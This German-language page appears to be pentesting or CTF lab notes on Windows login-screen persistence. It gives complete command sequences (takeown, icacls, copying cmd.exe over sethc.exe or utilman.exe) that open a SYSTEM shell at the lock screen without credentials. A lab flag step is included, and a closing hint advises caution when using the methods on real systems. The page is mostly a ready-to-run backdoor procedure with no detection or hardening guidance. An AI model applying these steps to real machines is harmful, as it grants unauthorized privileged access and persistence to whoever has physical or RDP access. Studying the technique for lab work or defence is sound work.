# Manipulation des Anmeldebildschirms / RDP-Zugangs

## **Persistenz über Login-Screen Backdoors (Barrierefreiheit)**

{% hint style="info" %}
Diese Techniken erfordern **physischen Zugriff** oder RDP auf die Maschine, da sie vor dem Einloggen am Sperrbildschirm ausgeführt werden. Sie nutzen Standardfunktionen von Windows zur **Barrierefreiheit**, um eine **SYSTEM-Shell ohne gültige Anmeldedaten** zu erhalten.
{% endhint %}

***

### **Sticky Keys Backdoor (sethc.exe)**

Windows ermöglicht das Aktivieren von Sticky Keys durch **5-maliges Drücken der Umschalttaste (SHIFT)**. Dabei wird folgende Datei ausgeführt:

```
C:\Windows\System32\sethc.exe
```

→ Wenn wir diese durch `cmd.exe` ersetzen, startet beim Drücken von **SHIFT x5** eine SYSTEM-Konsole – **sogar auf dem Login-Screen**.

#### Schritte:

1.  Besitz übernehmen:

    ```cmd
    takeown /f C:\Windows\System32\sethc.exe
    ```
2.  Schreibrechte setzen:

    ```cmd
    icacls C:\Windows\System32\sethc.exe /grant Administrator:F
    ```
3.  `sethc.exe` durch `cmd.exe` ersetzen:

    ```cmd
    copy C:\Windows\System32\cmd.exe C:\Windows\System32\sethc.exe
    ```
4. **Sitzung sperren (Lock)** und **5× SHIFT drücken**\
   → ➜ SYSTEM-Shell erscheint direkt am Login-Bildschirm.
5.  **Flag holen:**

    ```cmd
    C:\flags\flag14.exe
    ```

***

### **Ease of Access Backdoor (utilman.exe)**

Der Button „Ease of Access“ auf dem Login-Bildschirm startet standardmäßig:

```
C:\Windows\System32\utilman.exe
```

→ Auch diese Datei kann durch `cmd.exe` ersetzt werden, um beim Klick auf das Symbol eine SYSTEM-Shell zu öffnen.

#### Schritte:

1.  Besitz übernehmen:

    ```cmd
    takeown /f C:\Windows\System32\utilman.exe
    ```
2.  Schreibrechte setzen:

    ```cmd
    icacls C:\Windows\System32\utilman.exe /grant Administrator:F
    ```
3.  `utilman.exe` durch `cmd.exe` ersetzen:

    ```cmd
    copy C:\Windows\System32\cmd.exe C:\Windows\System32\utilman.exe
    ```
4. **Sitzung sperren** → Auf das **Ease-of-Access-Symbol klicken**\
   → ➜ SYSTEM-Konsole öffnet sich ohne Login.

***

{% hint style="danger" %}
#### Sicherheitshinweis

Beide Methoden sind extrem effektiv, aber auch auffällig. In realen Systemen sollten sie mit Vorsicht verwendet werden, da sie oft durch Sicherheitslösungen erkannt oder durch Gruppenrichtlinien blockiert sind.
{% endhint %}
